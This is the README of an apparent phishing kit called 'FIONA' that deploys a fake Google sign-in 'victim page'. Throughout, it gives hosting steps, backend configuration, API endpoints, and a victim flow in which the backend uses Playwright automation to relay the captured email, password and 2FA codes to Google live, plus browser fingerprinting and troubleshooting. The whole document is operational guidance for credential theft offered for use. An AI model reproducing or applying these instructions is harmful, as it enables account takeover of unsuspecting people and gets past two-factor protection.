# FIONA Google Sign-In Victim Page

**Professional Google Authentication UI for Credential Capture**

## 📦 Package Contents

```
google/
├── index.html          # Main HTML structure
├── styles.css          # Google-authentic styling
├── app.js              # Authentication flow logic
└── README.md           # This file
```

## 🚀 Deployment Instructions

### Option 1: Host on cPanel

1. **Upload Files**
   - Login to your cPanel
   - Navigate to File Manager → `public_html/`
   - Create a new folder (e.g., `google/`)
   - Upload all 3 files (`index.html`, `styles.css`, `app.js`)

2. **Access URL**
   ```
   https://yourdomain.com/google/?s=CAPTURE_ID
   ```

3. **Test**
   - Visit the URL with a capture ID from your admin panel
   - Verify email input works
   - Check browser console for any errors

### Option 2: Host on VPS/Dedicated Server

```bash
# Upload to web directory
scp -r google/ user@your-server:/var/www/html/

# Set permissions
chmod 644 /var/www/html/google/*
chmod 755 /var/www/html/google/

# Configure Nginx/Apache (if needed)
# The files can be served as static content
```

### Option 3: Serve from FIONA Backend

Files are already integrated and served automatically at:
```
https://yourdomain.com/google?s=CAPTURE_ID
```

## ⚙️ Configuration

The page automatically detects its backend API server. Default configuration:

```javascript
window.PRXY_CONFIG = {
    API_BASE_URL: 'https://your-backend-domain.com/api',
    API_KEY: 'your-api-key',
    CAPTURE_ID: 'from-url-query-string'
};
```

### Backend URL

The page will communicate with the backend specified in `API_BASE_URL`. This is pre-configured when you export from the admin panel.

**Important:** The backend must have CORS enabled for your victim domain.

## 🎯 Usage Flow

1. **Victim receives link**: `https://ibnjaldun.org/5bb80265`
2. **CAPTCHA verification** (handled by backend redirect)
3. **Redirects to Google UI**: `https://ibnjaldun.org/google?s=5bb80265`
4. **Victim enters email** → Backend initiates Playwright session
5. **Victim enters password** → Backend logs in via automation
6. **2FA challenge** (if required) → Backend handles verification
7. **Success redirect** → Victim redirected to real Google page
8. **Credentials captured** → Stored in backend database

## 🔒 Security Features

- **No external dependencies**: Pure HTML/CSS/JS
- **Disabled navigation links**: All Google links are non-functional
- **Authentic appearance**: Matches real Google styling 100%
- **Mobile responsive**: Works on all devices
- **Browser fingerprinting**: Collects device data for analysis

## 🛠️ Customization

### Change Colors

Edit `styles.css`:
```css
:root {
    --google-blue: #1a73e8;
    --google-red: #d93025;
    /* ... other colors */
}
```

### Modify Logo

Replace the SVG in `index.html` (search for `<svg viewBox="0 0 75 24"`).

### Add Custom Fields

Edit `index.html` and add input fields in the respective step div.

## 📊 API Endpoints Used

| Endpoint | Method | Purpose |
|----------|--------|---------|
| `/api/google/login/initiate` | POST | Start authentication session |
| `/api/google/login/password` | POST | Submit password |
| `/api/google/2fa` | POST | Submit 2FA code |
| `/api/google/2fa/switch` | POST | Switch 2FA method |
| `/api/sessions/{id}` | GET | Poll session status (PUSH challenges) |

## 🐛 Troubleshooting

### Issue: "Unable to sign in"
**Cause**: Backend API not reachable or CORS blocked.

**Fix**: 
- Check `API_BASE_URL` in browser console
- Verify backend CORS allows your victim domain
- Check Network tab for failed requests

### Issue: Page looks broken (no styling)
**Cause**: CSS file not loading.

**Fix**:
- Verify `styles.css` is in the same directory as `index.html`
- Check file permissions (644)
- Clear browser cache

### Issue: 2FA not appearing
**Cause**: Backend didn't return 2FA challenge.

**Fix**:
- Check backend logs for Google automation errors
- Verify Playwright is running (`npx playwright install-deps`)
- Test with an account that has 2FA disabled first

## 📝 License

**FIONA Design - Internal Use Only**

This victim page is part of the FIONA multi-tenant credential capture platform. Unauthorized distribution or use outside approved operations is prohibited.

## 📞 Support

For technical support, contact your FIONA administrator or open a ticket in the admin panel.

---

**Version**: 1.0.0  
**Last Updated**: 2026-10-26  
**Compatible with**: FIONA Backend v2.0+
